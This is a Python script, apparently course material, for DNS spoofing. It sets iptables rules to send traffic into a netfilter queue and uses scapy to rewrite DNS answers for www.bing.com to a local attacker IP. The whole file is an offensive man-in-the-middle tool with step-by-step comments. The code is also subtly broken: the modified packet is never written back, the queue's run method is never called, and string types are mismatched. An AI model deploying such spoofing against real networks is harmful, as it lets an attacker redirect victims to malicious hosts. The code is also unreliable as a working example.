#!/usr/bin/env python3

#iptables -I FORWARD -j NFQUEUE --queue-num 0
#iptables --flush - delete rules set up
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#set up for your own computer


import netfilterqueue
#need to have module installed - pip3 install netfilterqueue
#apt-get install build-essential python-dev libnetfilter-queue-dev if errors
import scapy.all as scapy
import subprocess

def set_iptables():
    print("\n[+] Setting up IPTables\n")
    subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    
def restore_iptables():
    print("\n[+] Flushing IPTables\n")
    subprocess.run(["iptables", "--flush"])

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #store packet as a variable;
    #wrapped in scapy layer that lets you access layers of packet using scapy;
    #then able to modify
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            dns_answer = scapy.DNSRR(rrname = qname, rdata = "10.0.2.15")   #DNSRR - DNS response
            scapy_packet[scapy.DNS].an = dns_answer
            scapy_packet[scapy.DNS].ancount = 1 #change answer count to just 1;
            #most websites will have multiple responses for DNS records ie bing.com
            
            #remove fields from original packet to prevent corrupted packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            #scapy will automatically recalculate these fields when it send them
            
            
            
        #print(scapy_packet.show())
    #print(packet)
    #print(packet.getpayload()) #shows raw output of packet
    #print(scapy_packet.show()) #using new scapy created var, show fields of packet
    #packet.drop() #drop packets, connectivity cut
    packet.accept() #forward packets to target, connectivity seems normal

try:
    while True:
        set_iptables()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet) #invoke bind method of NetfilterQueue
        #0 - queue number used in iptables
        #process packet is a callback function that will be run on each packet
        queue.run
except KeyboardInterrupt:
    print("\n[+] Stopping DNS Spoof")
    restore_iptables()
#all packets received will be put in the queue that was set up
#on target computer, connectivity will be interrupted as each packet is being held
